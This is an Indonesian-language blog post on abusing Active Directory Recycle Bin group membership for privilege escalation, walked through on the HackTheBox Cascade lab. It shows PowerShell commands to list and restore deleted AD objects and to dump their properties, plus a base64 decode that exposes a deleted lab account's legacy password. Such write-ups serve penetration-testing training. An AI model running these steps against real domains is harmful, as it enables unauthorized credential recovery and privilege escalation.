---
title: 'AD Recycle Abuse'
date: 2022-04-17 22:40:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, ad recycle abuse, privilege escalation, lateral movement]     # TAG names should always be lowercase
author: nairpaa
---

`AD Recycle Bin` adalah grup di Windows yang cukup terkenal. [Active Directory Object Recovery (Recycle Bin)](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/) adalah fitur yang ditambahkan di Windows Server 2008 yang memungkinkan administrator untuk memulihkan *item* yang dihapus (seperti *recycle bin* untuk file). 

Penyerang dapat memanfaatkan fitur ini untuk me-*restore* akun yang telah dihapus atau melihat *property* dari akun yang telah dihapus.

### Tujuan 

- *Privilege escalation* atau
- *lateral movement*

### Prasyarat

- Memiliki user dengan grup `AD Recycle Bin` 

### Tools

- Powershell

---

## Tahapan eksploitasi

Contoh eksploitasi kali ini dilakukan pada mesin **HackTheBox - Cascade**.

### Step 1: Cek Hak Akses Dengan BloodHound

Terlihat bahwa user **arksvc** adalah anggota dari grup **AD Recycle Bin**.

![AD Recycle Bin grup](/assets/img/posts/ad-recycle-bin-abuse/1.png)

### Step 2: Melihat Object Yang Telah Dihapus

- Melihat list object yang telah dihapus:

```powershell
PS> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

...<snipped>...                  

Deleted           : True                                                                 
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local                                                                
Name              : TempAdmin     

...<snipped>... 
```

- Melihat semua property dari akun yang terhapus:

```powershell
PS C:\> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Terlihat pada hasil di atas terdapat property `cascadeLegacyPwd`  yang berisi password user dalam bentuk Base64.

```bash
➜ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```


### Step 3 (Optional): Restore Object Yang Telah Dihapus

- Me-*restore* object

```powershell
PS> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects | Restore-ADObject

PS C:\> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property * | Restore-ADObject
```

---

## Referensi

- https://0xdf.gitlab.io/2020/07/25/htb-cascade.html#privesc-arksvc--administrator
- https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/
- https://stealthbits.com/blog/how-to-restore-deleted-active-directory-objects/
- https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html